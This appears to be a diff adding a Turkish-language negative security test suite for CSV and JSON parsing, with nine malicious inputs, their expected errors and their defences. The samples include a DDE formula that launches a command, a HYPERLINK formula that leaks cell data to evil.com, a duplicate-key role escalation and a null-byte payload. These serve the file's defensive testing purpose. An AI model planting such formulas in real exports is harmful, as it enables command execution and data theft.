@@ -1,0 +1,78 @@
+{
+  "aciklama": "G079 CSV ve JSON Veri Isleme Negatif Guvenlik Kontrolleri ve Zararli Veri Test Paketi",
+  "olusturma_tarihi": "2026-11-01",
+  "negatif_testler": [
+    {
+      "test_id": "NEG_01_CSV_FORMULA_INJECTION_EQUAL",
+      "aciklama": "Excel/Calc DDE komut calistirma amacli esittir (=) ile baslayan formül enjeksiyonu",
+      "format": "CSV",
+      "veri": "id,name,payload\n1,alice,=cmd|'/C calc'!A0",
+      "beklenen_hata": "FormulaInjectionWarning",
+      "savunma": "Hucre degeri basina tek tirnak (') eklenerek veya riskli karakter tespit edilerek formül yürütmesi nötralize edilir."
+    },
+    {
+      "test_id": "NEG_02_CSV_FORMULA_INJECTION_DDE_PLUS",
+      "aciklama": "Veri sizdirma amacli arti (+) ve HYPERLINK ile baslayan CSV enjeksiyonu",
+      "format": "CSV",
+      "veri": "id,name,payload\n2,bob,+HYPERLINK(\"http://evil.com/leak?data=\"&A1)",
+      "beklenen_hata": "FormulaInjectionWarning",
+      "savunma": "Arti (+), eksi (-), et (@), tab, satir sonu tetikleyicileri basina nötralizasyon karakteri konur."
+    },
+    {
+      "test_id": "NEG_03_CSV_COLUMN_COUNT_MISMATCH",
+      "aciklama": "Kacis karakteri eksikligi veya yanlis ayirici nedeniyle baslik kolon sayisi ile satir kolon sayisinin uyusmamasi",
+      "format": "CSV",
+      "veri": "col1,col2,col3\nval1,val2\nval1,val2,val3,val4",
+      "beklenen_hata": "ValueError",
+      "savunma": "Her satir baslik sutun sayisina gore katı dogrulanir, tutarsizlik tespit edildiginde islem reddedilir."
+    },
+    {
+      "test_id": "NEG_04_CSV_OVERSIZED_FIELD_DOS",
+      "aciklama": "CSV parser bellegini tuketmeye yonelik tanimlanan tavan degeri asan devasa alan",
+      "format": "CSV",
+      "veri": "id,data\n1,BURADA_COK_BUYUK_VERI_VAR",
+      "beklenen_hata": "ValueError",
+      "savunma": "max_field_size sınırı uygulanarak tampon asimi ve bellek tukenmesi (DoS) engellenir."
+    },
+    {
+      "test_id": "NEG_05_JSON_BOMB_DEEP_RECURSION",
+      "aciklama": "Stack overflow ve parser cokmesine yol acan asiri ic ice gecmis JSON nesne agaci",
+      "format": "JSON",
+      "veri": "DERIN_IC_ICE_JSON",
+      "beklenen_hata": "ValueError",
+      "savunma": "JSON ayristirma oncesinde veya yapisal kontrolunde derinlik siniri (max_depth=10) zorlanir."
+    },
+    {
+      "test_id": "NEG_06_JSON_DUPLICATE_KEY_COLLISION",
+      "aciklama": "Ayni JSON nesnesinde yetki yukseltme veya WAF atlatma amacli cift anahtar tanimi",
+      "format": "JSON",
+      "veri": "{\"role\": \"viewer\", \"threat_level\": \"LOW\", \"role\": \"admin\"}",
+      "beklenen_hata": "ValueError",
+      "savunma": "object_pairs_hook ile JSON yuklenirken ayni anahtarin birden fazla gecmesi durumunda ValueError uretilir."
+    },
+    {
+      "test_id": "NEG_07_JSON_NULL_BYTE_POISONING",
+      "aciklama": "Dize alanina yerlestirilmis C-stili null-byte (\\u0000) veri zehirleme girisimi",
+      "format": "JSON",
+      "veri": "{\"username\": \"admin\\u0000.evil\", \"role\": \"superadmin\"}",
+      "beklenen_hata": "ValueError",
+      "savunma": "Dize alanlari taranarak null-byte tespiti durumunda veri guvensiz kabul edilip reddedilir."
+    },
+    {
+      "test_id": "NEG_08_JSON_SCHEMA_INVALID_TYPE",
+      "aciklama": "Sayisal tip beklenen alana enjekte edilmis zararli dize veya tip uyumsuzlugu",
+      "format": "JSON",
+      "veri": "{\"event_id\": \"EVT-999\", \"threat_score\": \"YUKSEK_NOT_AN_INTEGER\"}",
+      "beklenen_hata": "TypeError",
+      "savunma": "JSON sema dogrulayici, alan turlerini ve deger araliklarini zorunlu kilar."
+    },
+    {
+      "test_id": "NEG_09_JSON_OVERSIZED_PAYLOAD_DOS",
+      "aciklama": "Parser bellek tavanini asan devasa boyutlu JSON yuk bildirimi",
+      "format": "JSON",
+      "veri": "OVERSIZED_PAYLOAD_DUMMY",
+      "beklenen_hata": "ValueError",
+      "savunma": "max_payload_bytes siniri JSON ayristirma oncesinde kontrol edilir."
+    }
+  ]
+}
